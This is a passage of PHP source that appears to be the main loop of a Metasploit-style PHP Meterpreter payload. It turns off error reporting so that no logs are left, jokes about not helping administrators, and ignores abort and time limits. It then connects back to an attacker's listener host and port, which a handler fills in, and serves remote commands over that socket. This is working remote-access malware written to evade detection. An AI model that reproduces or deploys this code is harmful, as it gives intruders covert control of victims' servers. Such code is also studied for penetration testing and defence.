        if (is_array($e) && is_array($streams_e)) { $e = array_merge($e, $streams_e); }
        $count += $res;
    }
    #my_print(sprintf("total: $count, Modified counts: r=%s w=%s e=%s", count($r), count($w), count($e)));
    return $count;
}

function add_reader($resource) {
    global $readers;
    if (is_resource($resource) && !in_array($resource, $readers)) {
        $readers[] = $resource;
    }
}

function remove_reader($resource) {
    global $readers;
    #my_print("Removing reader: $resource");
    #dump_readers();
    if (in_array($resource, $readers)) {
        foreach ($readers as $key => $r) {
            if ($r == $resource) {
                unset($readers[$key]);
            }
        }
    }
}


##
# Main stuff
##

ob_implicit_flush();

# For debugging
#error_reporting(E_ALL);
# Turn off error reporting so we don't leave any ugly logs.  Why make an
# administrator's job easier if we don't have to?  =)
error_reporting(0);

@ignore_user_abort(true);
# Has no effect in safe mode, but try anyway
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time',0);


# If we don't have a socket we're standalone, setup the connection here.
# Otherwise, this is a staged payload, don't bother connecting
if (!isset($GLOBALS['msgsock'])) {
    # The payload handler overwrites this with the correct LHOST before sending
    # it to the victim.
    $ipaddr = '127.0.0.1';
    $port = 4444;
    my_print("Don't have a msgsock, trying to connect($ipaddr, $port)");
    $msgsock = connect($ipaddr, $port);
    if (!$msgsock) { die(); }
} else {
    # The ABI for PHP stagers is a socket in $msgsock and it's type (socket or
    # stream) in $msgsock_type
    $msgsock = $GLOBALS['msgsock'];
    $msgsock_type = $GLOBALS['msgsock_type'];
    switch ($msgsock_type) {
    case 'socket':
        register_socket($msgsock);
        break;
    case 'stream':
        # fall through
    default:
        register_stream($msgsock);
    }
}
add_reader($msgsock);

#
# Main dispatch loop
#
$r=$GLOBALS['readers'];
while (false !== ($cnt = select($r, $w=null, $e=null, 1))) {
    #my_print(sprintf("Returned from select with %s readers", count($r)));
    $read_failed = false;
    for ($i = 0; $i < $cnt; $i++) {
        $ready = $r[$i];
        if ($ready == $msgsock) {
            $request = read($msgsock, 8);
            #my_print(sprintf("Read returned %s bytes", strlen($request)));
            if (false==$request) {
                #my_print("Read failed on main socket, bailing");
                # We failed on the main socket.  There's no way to continue, so
                # break all the way out.
                break 2;
            }
            $a = unpack("Nlen/Ntype", $request);
            # length of the whole packet, including header
            $len = $a['len'];
            # packet type should always be 0, i.e. PACKET_TYPE_REQUEST
            $ptype = $a['type'];
            while (strlen($request) < $a['len']) {
                $request .= read($msgsock, $len-strlen($request));
            }
            #my_print("creating response");
            $response = create_response($request);

            write($msgsock, $response);
        } else {
            #my_print("not Msgsock: $ready");
            $data = read($ready);
            if (false === $data) {
                handle_dead_resource_channel($ready);
            } elseif (strlen($data) > 0){
                my_print(sprintf("Read returned %s bytes", strlen($data)));
                $request = handle_resource_read_channel($ready, $data);
                if ($request) {
                    write($msgsock, $request);
                }
            }
        }
    }
    # $r is modified by select, so reset it
    $r = $GLOBALS['readers'];
} # end main loop
my_print("Finished");
my_print("--------------------");
close($msgsock);
